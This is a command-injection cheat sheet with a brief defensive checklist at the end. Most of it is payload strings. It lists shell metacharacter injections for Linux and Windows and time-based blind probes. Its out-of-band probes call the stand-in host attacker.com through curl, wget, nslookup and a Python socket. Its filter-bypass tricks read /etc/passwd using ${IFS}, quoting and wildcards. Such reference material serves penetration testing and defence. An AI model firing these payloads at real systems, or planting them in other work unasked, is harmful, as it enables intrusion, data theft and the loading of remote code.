# Command Injection: 2026 Complete Reference

## Shell Metacharacters

### Linux
```bash
; id
| id
|| id
& id
&& id
$(id)
`id`
%0a id        # Newline encoding
```

### Windows
```cmd
| dir
|| dir
& dir
&& dir
%0a dir
```

## Blind Detection

### Time-Based
```bash
; sleep 5
| ping -n 5 127.0.0.1
& ping -c 5 127.0.0.1
```

### Out-of-Band
```bash
; nslookup attacker.com
| curl http://attacker.com/test
& wget http://attacker.com/payload
; python -c 'import socket;s=socket.socket();s.connect(("attacker.com",80))'
```

## Filter Bypass

### Character Obfuscation
```bash
# Quoting
'/bin/sl'eep' 5'    # Mix quotes
# Environment variables
$0: ${0:-/bin/bash}
$IFS: /bin${IFS}cat${IFS}/etc/passwd
# Wildcard
/???/c?t /etc/passwd
```

### Newline Injection
```bash
# %0a (URL encoded newline) often splits commands
cmd=%0acat%20/etc/passwd%0a
```

## Tooling
- **commix**: Automated command injection detection and exploitation
- **Burp Intruder**: Fuzz parameter values with metacharacter prefixes

## Defensive Checklist
1. Never pass user input to shell functions (`os.system`, `subprocess.Popen(shell=True)`, `exec`, `system`)
2. Use parameterized APIs (`subprocess.Popen([cmd, arg])` without `shell=True`)
3. Whitelist allowed commands and parameters
4. Validate and sanitize input: reject `;`, `|`, `&`, `` ` ``, `$()`
5. Run application with least privilege (not root)